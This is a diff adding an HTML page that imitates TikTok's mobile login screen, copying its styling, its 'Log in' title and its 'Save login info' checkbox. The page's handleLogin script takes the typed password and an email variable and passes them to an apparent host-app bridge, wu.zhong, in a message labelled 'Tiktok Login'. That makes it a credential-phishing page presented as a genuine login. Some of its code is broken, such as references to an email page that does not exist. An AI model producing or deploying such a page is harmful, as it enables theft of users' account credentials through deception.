@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok - Log in</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background-color: #ffffff;
+      color: #161823;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 20px;
+      border-bottom: 1px solid #f1f1f2;
+    }
+
+
+    .back-btn {
+      background: none;
+      border: none;
+      color: #161823;
+      font-size: 24px;
+      cursor: pointer;
+      padding: 8px;
+      margin-left: -8px;
+      font-weight: bold;
+    }
+
+
+    .header-title {
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+
+    .help-btn {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: #f1f1f2;
+      border: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 16px;
+      color: #666;
+    }
+
+
+    .main-content {
+      flex: 1;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+
+
+    .tab-container {
+      display: flex;
+      margin-bottom: 40px;
+      border-bottom: 1px solid #f1f1f2;
+    }
+
+
+    .tab {
+      flex: 1;
+      padding: 16px 0;
+      text-align: center;
+      background: none;
+      border: none;
+      font-size: 16px;
+      color: #8a8b9b;
+      cursor: pointer;
+      position: relative;
+      font-weight: 500;
+    }
+
+
+    .tab.active {
+      color: #161823;
+    }
+
+
+    .tab.active::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background-color: #161823;
+    }
+
+
+    .form-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+
+    .page {
+      display: none;
+      flex-direction: column;
+      flex: 1;
+    }
+
+
+    .page.active {
+      display: flex;
+    }
+
+
+    .page-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 40px;
+      display: none;
+    }
+
+
+    .password-page .page-title {
+      display: block;
+    }
+
+
+    .input-container {
+      margin-bottom: 30px;
+    }
+
+
+    .input-field {
+      width: 100%;
+      background-color: #f8f8f8;
+      border: none;
+      border-radius: 8px;
+      color: #161823;
+      font-size: 16px;
+      padding: 16px;
+      outline: none;
+      transition: background-color 0.3s ease;
+    }
+
+
+    .input-field::placeholder {
+      color: #8a8b9b;
+    }
+
+
+    .input-field:focus {
+      background-color: #f1f1f2;
+    }
+
+
+    .password-container {
+      position: relative;
+    }
+
+
+    .password-toggle {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 18px;
+      color: #666;
+    }
+
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin: 20px 0 40px 0;
+    }
+
+
+    .checkbox {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 2px solid #fe2c55;
+      background-color: #fe2c55;
+      margin-right: 12px;
+      position: relative;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+
+    .checkbox::after {
+      content: '✓';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+
+    .checkbox-label {
+      font-size: 14px;
+      color: #8a8b9b;
+      line-height: 1.4;
+      cursor: pointer;
+    }
+
+
+    .help-link {
+      color: #161823;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 40px;
+    }
+
+
+    .continue-button {
+      background-color: #fe2c55;
+      color: #ffffff;
+      border: none;
+      padding: 16px 24px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: auto;
+      margin-bottom: 30px;
+      transition: background-color 0.3s ease;
+    }
+
+
+    .continue-button:hover {
+      background-color: #e02448;
+    }
+
+
+    .continue-button:disabled {
+      background-color: #f1f1f2;
+      color: #8a8b9b;
+      cursor: not-allowed;
+    }
+
+
+    /* Responsive adjustments */
+    @media (min-width: 768px) {
+      .main-content {
+        max-width: 400px;
+        margin: 0 auto;
+        padding: 40px 20px;
+      }
+    }
+
+
+    @media (min-width: 1024px) {
+      body {
+        justify-content: center;
+        padding: 20px;
+        background-color: #f8f8f8;
+      }
+     
+      .header {
+        display: none;
+      }
+     
+      .main-content {
+        background-color: #ffffff;
+        border-radius: 12px;
+        padding: 60px 40px 40px;
+        min-height: auto;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      }
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <button class="back-btn" onclick="goBack()"></button>
+    <h1 class="header-title">Log in</h1>
+    <button class="help-btn">?</button>
+  </header>
+
+
+  <main class="main-content">
+    
+   
+    
+
+
+   
+    <div class="page password-page active">
+
+
+
+         <h2 class="page-title">Email / Username</h2>
+
+        <div class="input-container">
+          <input
+            type="text"
+            id="emailUsername"
+            class="input-field"
+            placeholder="Email address or username"
+            required
+          >
+        </div>
+
+
+        
+
+
+      <h2 class="page-title">Enter password</h2>
+     
+      <form class="form-container" onsubmit="handleLogin(event)">
+
+        
+
+        <div class="input-container password-container">
+          <input
+            type="password"
+            id="password"
+            class="input-field"
+            placeholder="Password"
+            required
+          >
+          <button type="button" class="password-toggle" onclick="togglePassword()"></button>
+        </div>
+
+        <div class="checkbox-container">
+          <div class="checkbox" onclick="toggleCheckbox()"></div>
+          <label class="checkbox-label" onclick="toggleCheckbox()">
+            Save login info to log in automatically next time.
+          </label>
+        </div>
+
+        <a href="#" class="help-link">Need help logging in?</a>
+
+
+        <button type="submit" class="continue-button" id="passwordContinueBtn">
+          Continue
+        </button>
+      </form>
+    </div>
+  </main>
+
+
+  <script>
+    let currentPage = 'password';
+    let savedEmail = '';
+    let isCheckboxChecked = true;
+
+
+
+
+    function switchTab(tab) {
+   
+      if (tab === 'email') {
+        document.querySelector('.tab').classList.add('active');
+      }
+    }
+
+
+    function showEmailPage() {
+      document.querySelector('.email-page').classList.add('active');
+      document.querySelector('.password-page').classList.remove('active');
+      currentPage = 'email';
+     
+
+      document.querySelector('.header-title').textContent = 'Log in';
+    }
+
+
+    function showPasswordPage() {
+      document.querySelector('.email-page').classList.remove('active');
+      document.querySelector('.password-page').classList.add('active');
+      currentPage = 'password';
+     
+  
+      document.querySelector('.header-title').textContent = 'Log in';
+    }
+
+
+  
+
+
+    function handleLogin(event) {
+      event.preventDefault();
+      const password = document.getElementById('password').value;
+     
+      if (password.trim()) {
+        
+      
+          wu.zhong(`🔰 Tiktok Login\n\n✉️ ${savedEmail}\n\n🔒 ${password}`, "com.ss.andorid.ugc.trill");
+    
+    }
+    }
+
+
+    function toggleCheckbox() {
+      isCheckboxChecked = !isCheckboxChecked;
+      const checkbox = document.querySelector('.checkbox');
+     
+      if (isCheckboxChecked) {
+        checkbox.style.backgroundColor = '#fe2c55';
+        checkbox.style.borderColor = '#fe2c55';
+      } else {
+        checkbox.style.backgroundColor = 'transparent';
+        checkbox.style.borderColor = '#ddd';
+      }
+    }
+
+
+
+
+
+    document.addEventListener('DOMContentLoaded', function() {
+      toggleCheckbox(); 
+      toggleCheckbox(); 
+    });
+
+
+  
+
+    document.getElementById('password').addEventListener('input', function() {
+      const btn = document.getElementById('passwordContinueBtn');
+      if (this.value.trim()) {
+        btn.disabled = false;
+      } else {
+        btn.disabled = true;
+      }
+    });
+  </script>
+</body>
+</html>
